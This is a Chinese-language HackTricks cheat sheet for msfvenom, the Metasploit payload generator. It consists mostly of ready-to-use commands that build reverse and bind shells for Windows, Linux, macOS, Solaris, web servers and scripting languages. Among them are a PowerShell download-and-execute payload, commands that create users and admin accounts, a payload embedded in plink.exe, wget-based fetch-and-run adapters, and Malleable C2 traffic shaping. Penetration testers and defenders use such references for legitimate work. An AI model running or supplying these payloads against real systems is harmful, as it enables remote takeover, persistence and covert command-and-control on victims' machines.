# MSFVenom - 速查表

{{#include ../../banners/hacktricks-training.md}}

---

## 基础 msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

使用 `-a` 选择 payload 架构，使用 `--platform` 选择其目标平台。<sup>[[1]](#references)</sup>

## 列表
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
这些命令列出了已安装框架中可用的 payload 和 encoder 模块。<sup>[[1]](#references)</sup>

## 创建 shellcode 时的常用参数
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
这里显示的 flags 用于选择 bad characters、输出格式、encoder 和 encoding iterations。<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter 流量塑形

Metasploit 6.5 为 staged 和 stageless reverse HTTP(S) Meterpreter payload 添加了 `MALLEABLEC2` 选项。该 profile 可以更改 URIs、user agents、请求/响应 headers、connection-ID 的放置位置，以及支持的 body encodings/wrappers。生成的 payload 及其 handler 都必须加载**同一个本地 profile**。staged payload 初始请求 Meterpreter stage 时不会进行塑形，因此当第一个请求也必须匹配该 profile 时，建议使用 `windows/x64/meterpreter_reverse_https` 之类的 stageless payload。<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
使用相同的 payload 和 profile 配置匹配的 handler：<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
只有文档中注明已实现的指令才会影响流量；不受支持的 profile 代码块可能可以成功解析，但不会产生任何效果。<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### 创建用户
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **执行命令**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding is not AV evasion:** encoders such as `x86/shikata_ga_nai` are primarily useful for satisfying bad-character constraints. Repeated encoding is not a reliable AV-evasion technique.<sup>[[1]](#references)</sup>

### 嵌入可执行文件中
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **基于 Web 的 Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **脚本语言 payload**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payload 会生成一条命令，使目标上可用的 utility 下载并执行底层 native payload。其名称格式为 `cmd/<platform>/<fetch-protocol>/<served-payload>`；可用的 adapter 包括 HTTP(S)、SMB 和 TFTP，具体的 downloader 选项取决于目标平台。<sup>[[2]](#references)</sup>

例如，生成一条 Linux `wget` 命令，从端口 8080 获取 x64 Meterpreter payload，并通过端口 4444 回连：<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
使用相同的设置启动 **fetch handler**；它会托管生成的 ELF，并为所提供的 Meterpreter payload 启动 handler：<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
有用的相关选项包括：使用 `FETCH_PIPE=true` 可在支持的情况下生成更短的 HTTP(S) 命令；使用 `FETCH_FILELESS=shell`、`shell-search` 或 `python3.8+` 可从匿名文件描述符执行 Linux ELF。Fileless 模式要求 Linux kernel 3.17 或更高版本；请使用 `msfvenom -p <FETCH_PAYLOAD> --list-options` 检查确切的 adapter，因为支持的组合各不相同。<sup>[[2]](#references)</sup>



## References

- [1] [如何使用 msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [如何使用 Fetch Payloads](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Malleable C2 Profiles](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
